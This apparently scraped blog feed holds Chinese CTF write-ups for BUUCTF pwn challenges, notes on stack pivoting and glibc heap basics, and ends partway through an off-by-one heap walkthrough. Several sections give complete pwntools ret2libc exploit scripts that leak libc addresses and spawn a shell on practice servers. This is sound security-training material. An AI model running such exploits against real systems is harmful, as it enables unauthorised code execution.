-<p>没有在程序中找到system、binsh这些</p>
-<p>所以就当作ret2libc来做</p>
-<p>首先用write输出write或read的got表中的真实地址，之后用LibcSearcher查libc的版本</p>
-<p>最后计算system、binsh的偏移拿shell</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27746</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">plt_write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(plt_write) + p32(elf.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>]) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_real = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(plt_write) + p32(elf.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>]) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_real = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(address=read_real,func=<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">libc.add_condition(address=write_real,func=<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = read_real - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(system_addr) + p32(elf.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>]) + p32(binsh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><p>首先检查安全机制</p>
-<p><img src="image-20201107205948502.png" alt="image-20201107205948502"></p>
-<p>开启了NX的64位程序</p>
-<p><img src="image-20201107210109388.png" alt="image-20201107210109388"></p>
-<p>vuln函数就是一个read读了0x64，但是距离rbp只有0x20，造成溢出</p>
-<p>本质上和上面那道题目是一样的，就是ret2libc</p>
-<p>首先通过puts函数泄漏puts在got表中的地址</p>
-<p>之后用LibcSearcher查找libc的版本，最后调用<code>system(&quot;/bin/sh&quot;)</code></p>
-<p>但是也存在一点点和前面差异的地方</p>
-<p>一是puts函数在得到地址的时候是一个6字节的值，而不是8字节，需要一点点处理</p>
-<p>另外就是因为程序是64位的，需要通过rdi传参</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29286</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./bjdctf_2020_babyrop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt_puts = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got_puts = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(got_puts) + p64(plt_puts) + p64(vuln)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">real_puts = u64(io.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(address=real_puts,func=<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = real_puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+libc_base) + p64(libc.dump(<span class="string">&#x27;system&#x27;</span>)+libc_base)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这个代码在执行时会查到好几个版本的Libc，其中选择的是标号为2的可以拿到shell</p>
-<p><img src="image-20201107221552664.png" alt="image-20201107221552664"></p>
-<h2 id="HarekazeCTF2019-babyrop2"><a href="#HarekazeCTF2019-babyrop2" class="headerlink" title="HarekazeCTF2019_babyrop2"></a>HarekazeCTF2019_babyrop2</h2><p>首先checksec</p>
-<p><img src="image-20201107222717630.png" alt="image-20201107222717630"></p>
-<p>64位程序开启了NX</p>
-<p>反编译main函数之后</p>
-<p><img src="image-20201107222819665.png" alt="image-20201107222819665"></p>
-<p>溢出点在read函数</p>
-<p>和之前的区别在于这个是要使用printf泄漏出libc的地址</p>
-<p>在程序中搜索格式化字符串，搜到了<code>%s</code></p>
-<p><img src="image-20201107232442853.png" alt="image-20201107232442853"></p>
-<p>在调用printf函数的时候至少需要两个参数</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,got_read);</span><br></pre></td></tr></table></figure>
-
-<p>所以除了<code>pop rdi</code>还需要<code>pop rsi</code></p>
-<p>之后就首先用printf泄漏出 read在got表的地址，之后回到main函数重新执行，通过libc的版本计算出<code>system</code>和<code>/bin/sh</code>的偏移后调用拿到shell</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29161</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400731</span></span><br><span class="line"></span><br><span class="line">got_read = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">plt_printf = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_s = <span class="number">0x400790</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(printf_s) + p64(pop_rsi_r15) + p64(got_read) + p64(<span class="number">0</span>) +p64(plt_printf) + p64(main)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;again, &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">real_read = u64(io.recvuntil(<span class="string">&#x27;!&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(address=real_read, func=<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = real_read - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>两个libc中标号为1的可以拿到shell，flag被爆存在了<code>/home/babyrop2/flag</code></p>
-<h2 id="sctf-2016-pwn2"><a href="#sctf-2016-pwn2" class="headerlink" title="sctf_2016_pwn2"></a>sctf_2016_pwn2</h2><p>首先检查程序的安全机制</p>
-<p><img src="image-20201112091158929.png" alt="image-20201112091158929"></p>
-<p>反编译main函数</p>
-<p><img src="image-20201112091459158.png" alt="image-20201112091459158"></p>
-<p>这里存在的问题是这个v2没有转换为unsigned来判断，输入一个负数之后就可以绕过<code>v2&gt;32</code>的逻辑</p>
-<p>然后后面又把v2当作<code>%u</code>来读数据</p>
-<p>所以输入一个负数以后溢出即可，后面就是比较常规的ROP</p>
-<p><img src="image-20201112091841744.png" alt="image-20201112091841744"></p>
-<p>程序里面有这样一个<code>do_thing</code>的函数，里面有一个<code>int 80h</code>的gadget</p>
-<p>通过这个gadget可以调用系统调用，前面只要对eax赋值就可以了</p>
-<p>或者也可以用常规的printf泄漏libc的基地址</p>
-<p>前面那个思路没有找到对eax赋值的gadget</p>
-<p>最后用printf泄漏基地址做的</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25094</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn2_sctf_2016&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt_printf = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">got_printf = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">vuln = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">format_str = <span class="number">0x8048702</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;read? &#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2c</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span> + p32(plt_printf) + p32(vuln) + p32(format_str) + p32(got_printf)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">real_printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,real_printf)</span><br><span class="line"></span><br><span class="line">libc_base = real_printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;read? &#x27;</span>)</span><br><span class="line">io.sendline(str(<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2c</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span> + p32(system_addr) + p32(vuln) + p32(binsh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这个match到的libc有十多个，选的怀疑人生</p>
-<p>甚至都觉得自己的exp写错了</p>
-<p>最后正确的是这个版本</p>
-<p><img src="image-20201112102913739.png" alt="image-20201112102913739"></p>
-<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>首先checksec</p>
-<p><img src="buuctf-pwn1/image-20201112103913949.png" alt="image-20201112103913949"></p>
-<p>反编译后主要执行的是一个chall的函数</p>
-<p><img src="buuctf-pwn1/image-20201112104252777.png" alt="image-20201112104252777"></p>
-<p>程序运行时首先直接给了缓冲区s的地址</p>
-<p><img src="buuctf-pwn1/image-20201112104424768.png" alt="image-20201112104424768"></p>
-<p>最下面有一个strcmp的比较，如果s内容为<code>crashme</code>就会执行vuln函数</p>
-<p>vuln函数内部是一个memcpy，将s向栈上的一个地址写入0x400的长度</p>
-<p><img src="buuctf-pwn1/image-20201112105129351.png" alt="image-20201112105129351"></p>
-<p>因为程序没有开启nx保护，而且还给出了我们buffer的其实地址</p>
-<p>计算出偏移后直接跳到栈上执行shellcode就可以</p>
-<p>但是这里的问题就是要计算出s和vuln函数返回值之间的偏移</p>
-<p>这个需要调试来看</p>
-<p>在python脚本里面加上<code>gdb.attach(io)</code></p>
-<p>调试发现距离28</p>
-<p>写出脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>buuctf</category>
-      </categories>
-      <tags>
-        <tag>hack</tag>
-        <tag>CTF</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Stack-Pwn</title>
-    <url>/2020/11/19/Stack-Pwn/</url>
-    <content><![CDATA[<p>学习到的栈相关的内容</p>
-<a id="more"></a>
-
-
-
-<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>首先，在栈溢出发生时栈的一个基本结构是比较简单的</p>
-<p><img src="image-20201119101751227.png" alt="image-20201119101751227"></p>
-<p>如果我们可以溢出的长度比较有限，只能控制ebp以及return address这两个地方</p>
-<p>那么就可以考虑使用栈迁移这样一个技巧</p>
-<p>核心有两个要求：</p>
-<ol>
-<li>能够在内存可执行区域写入一定长度的代码；</li>
-<li>能够控制ebp以及return address</li>
-</ol>
-<p>执行栈迁移时，控制ebp为我们控制的一个地址，return address则填写一个<code>leave;ret;</code>的gadget地址</p>
-<p>leave指令相当于<code>mov esp,ebp;pop ebp</code></p>
-<p>所以整个gadget相当于执行了<code>mov esp,ebp;pop ebp;ret</code></p>
-<p>这样一个gadget实际上做了什么事情呢？</p>
-<p><img src="image-20201119103212438.png" alt="image-20201119103212438"></p>
-<p>首先<code>mov esp,ebp</code>这个指令清空了子函数的栈，esp和ebp现在都指向old ebp的位置</p>
-<p>之后<code>pop ebp</code>将ebp的值设置为栈中保存地址</p>
-<p>最后要执行<code>ret</code>跳转到栈中保存的返回地址处</p>
-<p>如果我们这里控制old ebp为一个其他段，例如bss段中的地址，ret addr中是这个gadget的地址</p>
-<p>在函数第一次执行到返回这样的一个过程中，我们将ebp成功放到了bss段上，但是其实esp还没有被控制</p>
-<p>接下来执行到ret这个地方时又执行了一遍<code>ret addr</code>这里保存的gadget</p>
-<p>第二次的这个过程就让esp变成了我们填写的old ebp的位置的值</p>
-<p>整个这样一个过程，我们通过控制的这样两个值，让esp指向了我们需要的一个位置</p>
-<p>同时ebp其实也是可以控制其中的值的，但是因为它对我们shellcode的执行并没有影响，所以可以随便设置</p>
-]]></content>
-      <categories>
-        <category>Pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Heap-Pwn</title>
-    <url>/2020/09/19/Heap-Pwn/</url>
-    <content><![CDATA[<h2 id="堆基本知识"><a href="#堆基本知识" class="headerlink" title="堆基本知识"></a>堆基本知识</h2><p>堆是可以提供动态分配的内存，在程序虚拟地址中是一块连续的线性空间，从低地址向高地址增长，管理堆的程序被称为堆管理器；</p>
-<p>在linux pwn里面一般关注的是ptmalloc2，是glibc2.3以后集成的堆管理器。</p>
-<p>需要注意的是，在linux中有这样一个基本的内存管理思想：</p>
-<blockquote>
-<p><strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong></p>
-</blockquote>
-<h3 id="堆的基本函数"><a href="#堆的基本函数" class="headerlink" title="堆的基本函数"></a>堆的基本函数</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="keyword">size_t</span> n);</span><br></pre></td></tr></table></figure>
-
-<p>关于malloc需要注意的是：</p>
-<ol>
-<li>malloc返回的是对应内存块的指针</li>
-<li>当n为0时，返回当前系统允许的堆最小内存块</li>
-<li>当n为负数时，由于大多数系统中<code>size_t</code>是一个无符号数，所以会分配很大一块空间，但是一般情况下都会失败；</li>
-</ol>
-<h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(<span class="keyword">void</span> *p);</span><br></pre></td></tr></table></figure>
-
-<p>和malloc可以说是一个对应关系，free用于释放内存块</p>
-<ol>
-<li>p为空指针时不进行任何操作；</li>
-<li>p已经被释放后，再次释放会导致乱七八糟的效果(double free)</li>
-<li>如果释放的空间很大，一般会直接还给系统以减小程序占用的空间，除非禁用<code>mallopt</code></li>
-</ol>
-<h3 id="背后的系统调用"><a href="#背后的系统调用" class="headerlink" title="背后的系统调用"></a>背后的系统调用</h3><p>malloc函数和free函数是程序猿编程时调用的程序，但是实际上背后运行的并不是这些东西，而是通过更简单的函数系统调用实现的</p>
-<h4 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h4><p>brk函数实际上执行的操作很简单，就是移动堆的指针，有些类似于移动esp的函数；</p>
-<p>通过移动栈上的esp就可以让栈增大或缩小，同理移动brk用于控制堆的大小。</p>
-<p><img src="./program_virtual_address_memory_space.png" alt="程序内存布局"></p>
-<p>brk函数和start_brk最初指向的地址是一致的，都位于bss段向上一个随机偏移（如果不开启ASLR则是直接在bss段的结尾）</p>
-<p>brk通过移动heap的顶端来实现heap的扩容和回收</p>
-<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><p>mmap就是memory map，从名字看也是和内存管理相关的；</p>
-<p>mmap的好处在于可以分配私有匿名的内存空间</p>
-<p>mmap的可以用来在虚拟内存地址空间中分配地址空间，创建和物理内存的映射关系；</p>
-<p>映射关系可以分文件映射和匿名映射两种，文件映射是文件映射进虚拟内存，匿名映射则是一片全0的空间；又可以根据共享方式分为私有映射和共享映射，其中私有映射是这个进程独有的，其他进程无法读写修改，也不会反应到物理内存中；因此总结一下一共存在四种映射。</p>
-<p>这里用一个例子来看一下mmap和对应的munmap函数对进程虚拟内存的影响；在linux中可以查看<code>/proc/pid/maps</code>来看内存的布局</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = <span class="literal">NULL</span>;</span><br><span class="line">        addr = mmap(<span class="literal">NULL</span>, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">                errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Unmap mapped region. */</span></span><br><span class="line">        ret = munmap(addr, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">                errExit(<span class="string">&quot;munmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After munmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行的程序就是这样简单的调用mmap和munmap，可以趁程序在getchar等待输入的时候查看内存布局</p>
-<p><img src="./image-20200923073653910.png" alt="munmap前后内存区域差异"></p>
-<p>这里面框出来的两个就是munmap执行前后的差别；</p>
-<p>在ctfwiki里面写到运行的结果</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br><span class="line"></span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e00000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>
-
-<p>这应该是运行在32位系统下的效果，mmap分配的匿名空间在b7开头的地址空间；</p>
-<p>而图中测试在64位下，mmap分配的区域在7f开头的内存空间，和加载的so文件比较接近</p>
-<hr>
-<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>堆溢出和栈溢出的差异在于，堆上不存在可以直接影响控制流的返回地址，因此一般无法直接通过堆溢出控制EIP</p>
-<p>漏洞利用的思路一般是：</p>
-<ol>
-<li>寻找堆分配函数</li>
-<li>寻找危险函数</li>
-<li>确定填充长度</li>
-</ol>
-<h4 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h4><p>堆分配函数一般是malloc、calloc、realloc等；</p>
-<p>其中calloc在分配内存区域之后会将其置0；</p>
-<p>realloc函数则和另外两个有些不同，具有两个参数</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">realloc</span>(ptr,size);</span><br></pre></td></tr></table></figure>
-
-<p>根据ptr和size的不同，realloc函数实际执行的效果也是不同的；</p>
-<ul>
-<li><p>当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时</p>
-</li>
-<li><p>如果申请 size &gt; 原来 size</p>
-</li>
-<li><ul>
-<li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小<pre><code>- 如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size) </code></pre>
-</li>
-</ul>
-</li>
-<li><p>如果申请 size &lt; 原来 size</p>
-</li>
-<li><ul>
-<li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变<pre><code>- 如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</code></pre>
-</li>
-</ul>
-</li>
-<li><p>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</p>
-</li>
-<li><p>当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</p>
-</li>
-</ul>
-<h4 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h4><p>危险函数是可能导致泄漏信息或是溢出的函数</p>
-<p>包括：</p>
-<ul>
-<li>gets、scanf、vscanf</li>
-<li>sprintf</li>
-<li>strcpy、strcat、bcopy</li>
-</ul>
-<p>等</p>
-<h4 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h4><p>malloc函数执行时实际分配的内存和请求的数量未必是相同的；</p>
-<p>因为ptmalloc在内存分配时是按照系统2倍最小字长进行对齐的；</p>
-<p>也就是说32位系统按照8字节对齐，64位系统按照16字节对齐。</p>
-<h4 id="特殊的堆溢出"><a href="#特殊的堆溢出" class="headerlink" title="特殊的堆溢出"></a>特殊的堆溢出</h4><p>有时候会出现一个字节的溢出，这一般是边界检查不严格造成的，这一般称为off-by-one漏洞。</p>
-<p>off-by-one漏洞的利用思路：</p>
-<ol>
-<li>溢出字节为任意字节时可能通过修改下一个块结构的大小导致结构重叠，进而泄漏数据或是覆盖其他块的数据；</li>
-<li>溢出字节为NULL字节时，可以使得下一个块的<code>prev_in_use</code>位被清零，这样前块被认为是free，这时可以<ol>
-<li>unlink进行处理；</li>
-<li>或是伪造<code>prev_size</code>导致块间重叠；</li>
-</ol>
-</li>
-</ol>
-<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>以几道CTF来练一下手</p>
-<h4 id="Asis-CTF-2016-b00k"><a href="#Asis-CTF-2016-b00k" class="headerlink" title="Asis CTF 2016 b00k"></a>Asis CTF 2016 b00k</h4><p>首先检查程序的安全机制</p>
-<p><img src="heap-overflow/image-20200926194107247.png"></p>
-<p>是一个64位程序，并且除了gs，其他几个安全机制都开启了</p>
-<p>运行一下程序，功能是一个图书管理的程序</p>
-<p><img src="heap-overflow/image-20200926202511078.png" alt="image-20200926202511078"></p>
-<p>反编译得到main函数的伪代码</p>
-<p><img src="heap-overflow/image-20200926195340455.png" alt="image-20200926195340455"></p>
-<p>点开每一个具体的函数之后，可以发现其中读取文字内容时是使用到了程序自己定义的一个新函数</p>
-<p><img src="heap-overflow/image-20200927204517434.png" alt="image-20200927204517434"></p>
-<p>我们暂且将其称为<code>new_read</code></p>
-<p><img src="heap-overflow/image-20200927204730211.png" alt="image-20200927204730211"></p>
-<p>可以看到这个函数在调用时，第一个参数是指向一个缓冲区的指针；</p>
-<p>第二个参数是要读入的长度，减去了一个null byte，这样的读是没有问题的</p>
-<p><img src="heap-overflow/image-20200927213357312.png" alt="image-20200927213357312"></p>
-<p>但是对于修改author name的函数，在调用这个read时设置的长度忘记了减一，这里有可能存在一个byte的溢出</p>
-<p>设置author name为一个32字节长的内容</p>
-<p>之后创建一个book之后，调用第四个方法print</p>
-<p>就会出现这样的效果</p>
-<p><img src="heap-overflow/image-20200928094900882.png" alt="image-20200928094900882"></p>
-<p>看到除了author name之外还出现了一些其他的字符串</p>
-<p>在Create book的函数中，实际分配图书的结构部分代码如下：</p>
-<p><img src="heap-overflow/image-20200928110059338.png" alt="image-20200928110059338"></p>
-<p>存储的位置是在off_202010这个地方的指向的位置</p>
-<p><img src="heap-overflow/image-20200928110142911.png" alt="image-20200928110142911"></p>
-<p>也就是从202060开始的区域，而这里可以看到author_name的字符串是存储在202040开始的0x20个字节处的，因此溢出1个字节正好可以覆盖掉第一个book的结构体中id这样的一个字段中的值</p>
-<p>利用的思路：</p>
-<ol>
-<li>使author name长度为32</li>
-<li>创建book1，覆盖掉author name最后的NULL byte；并且要让book的description占比较大的空间，在其中伪造一个book结构</li>
